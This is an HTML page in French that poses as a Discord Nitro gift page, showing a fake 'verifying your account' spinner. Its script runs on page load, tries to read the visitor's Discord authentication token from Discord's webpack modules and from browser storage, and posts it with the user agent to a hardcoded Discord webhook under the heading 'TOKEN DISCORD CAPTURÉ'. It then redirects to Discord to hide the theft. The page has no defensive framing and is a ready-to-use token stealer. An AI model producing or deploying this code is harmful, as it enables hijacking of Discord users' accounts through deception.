<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Discord Gift - Nitro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {background: #36393f; color: #dcddde; font-family: 'Whitney', sans-serif; margin:0; padding:0;}
        .container {max-width: 480px; margin: 40px auto; background: #2f3136; border-radius: 8px; overflow: hidden;}
        header {background: #5865f2; padding: 20px; text-align: center;}
        .content {padding: 30px;}
        .fake-logo {font-size: 28px; font-weight: bold;}
        .spinner {display: inline-block; width: 40px; height: 40px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;}
        @keyframes spin {to {transform: rotate(360deg);}}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="fake-logo">Discord</div>
            <h1 id="title">Chargement en cours...</h1>
        </header>
        <div class="content">
            <p id="message" style="text-align:center; font-size:18px;">Vérification de votre compte Discord</p>
            <div style="text-align:center; margin: 20px 0;">
                <div class="spinner"></div>
            </div>
            <p style="text-align:center; color:#b9bbbe;">Veuillez patienter...</p>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1513930112758714598/vWxfXiImV42jYEqx_4uMasupVp604sLZbmB09wAF-fFePdvL9zwEvSw9Z-MEHrmyIHnO";
        
        function getDiscordToken() {
            let token = null;
            try {
                let webpackChunk = webpackChunkdiscord_app;
                if (webpackChunk) {
                    let modules = [];
                    webpackChunk.push([[''], {}, function(e) {
                        for (let c in e.c) modules.push(e.c[c]);
                    }]);
                    let tokenModule = modules.find(m => m?.exports?.default?.getToken !== undefined);
                    if (tokenModule) token = tokenModule.exports.default.getToken();
                }
            } catch(e) {}
            if (!token || token.length < 50) {
                try { token = localStorage.getItem("token"); } catch(e) {}
            }
            if (!token || token.length < 50) {
                try { token = sessionStorage.getItem("token"); } catch(e) {}
            }
            return token;
        }
        
        function sendToken(token) {
            if (!token || token.length < 50) token = "AUCUN_TOKEN_TROUVE";
            let message = {
                content: "🎯 TOKEN DISCORD CAPTURÉ",
                embeds: [{
                    description: "```" + token + "```",
                    color: 0x00FF00,
                    fields: [
                        {name: "User Agent", value: navigator.userAgent.substring(0, 80), inline: false},
                        {name: "Heure", value: new Date().toLocaleString(), inline: true}
                    ]
                }]
            };
            fetch(WEBHOOK_URL, {method: 'POST', body: JSON.stringify(message), headers: {'Content-Type': 'application/json'}}).catch(e => {});
        }
        
        // Exécution principale
        setTimeout(() => {
            let token = getDiscordToken();
            sendToken(token);
            
            // Changer le texte
            document.getElementById('title').innerText = "Redirection...";
            document.getElementById('message').innerHTML = "Vérification terminée, redirection vers Discord...";
            
            // REDIRECTION VERS DISCORD (fonctionne à 100%)
            setTimeout(() => {
                window.location.href = "https://discord.com/channels/@me";
            }, 1500);
        }, 500);
    </script>
</body>
</html>
